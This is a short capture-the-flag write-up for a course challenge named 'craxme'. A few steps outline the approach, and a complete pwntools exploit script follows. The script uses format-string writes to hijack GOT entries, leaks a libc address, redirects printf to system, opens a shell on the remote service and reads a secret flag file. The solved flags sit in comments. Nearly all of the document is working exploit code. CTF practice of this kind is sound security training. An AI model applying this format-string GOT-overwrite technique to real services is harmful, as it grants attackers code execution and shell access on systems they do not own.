# Week 6 practice
## craxme 2 & 3 100
* First `fmt` -> Overwrite `puts` got with `0x400747` for many times of `fmt`, and also leak `libc`.
* Second `fmt` -> Overwrite `printf_GOT` with `system`.
* Third time `printf( Input )` -> `system( Input )` -> `system( "sh" )`

```python
#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{JUST CRAXME!@_@}
# FLAG{this is the second flag!!!! >_<}
# FLAG{YOUF0UNDtheSECRETFL4G!?}

e = ELF('./craxme-2da5957de53a93b4bc9ffb4e46c8bf287df0376c')

context.arch = 'amd64'

host , port = 'csie.ctf.tw' , 10134

y = remote(host,port)
#y = process( './craxme' )
#print util.proc.pidof( y )
#raw_input( '...' )

#p = '%.218x%8$n......' + p64(0x60106c)
#p = '%45068c%10$hn%19138c%11$hn......' + p64(0x60106c) + p64(0x60106c + 2)

p = '%11$n%64c%12$hn%1799c%13$hnyuawn%14$s...' + p64( e.got['puts'] + 4 ) + p64( e.got['puts'] + 2 )+ p64( e.got['puts'] ) + p64( e.got['__libc_start_main'] )
y.sendlineafter( ':' , p )

y.recvuntil( 'yuawn' )
__libc_start_main = u64( y.recv(6).ljust( 8 , '\x00' ) )
log.success( '__libc_start_main -> %s' % hex( __libc_start_main ) )
system = __libc_start_main + 0x24c50
log.success( 'system -> %s' % hex( system ) )

print hex( system & 0xffffffff )

a = ( system & 0xffff )
b = ( system & 0xffff0000 ) >> 16

print hex( a ) , hex( b )

sleep( 3 )

if a < b:
    p = '%{}c%12$hn%{}c%13$hn'.format( str( a ) , str( b - a ) )
    p += '.' * ( 40 - len( p ) )
    p += p64( e.got['printf'] ) + p64( e.got['printf'] + 2 )
else:
    p = '%{}c%12$hn%{}c%13$hn'.format( str( b ) , str( a - b ) )
    p += '.' * ( 40 - len( p ) )
    p += p64( e.got['printf'] + 2 ) + p64( e.got['printf'] )

y.sendline( p )

y.sendline( 'sh;' )

sleep( 1 )

y.sendline( 'cat /home/`whoami`/S3cretflag' )

y.interactive()
```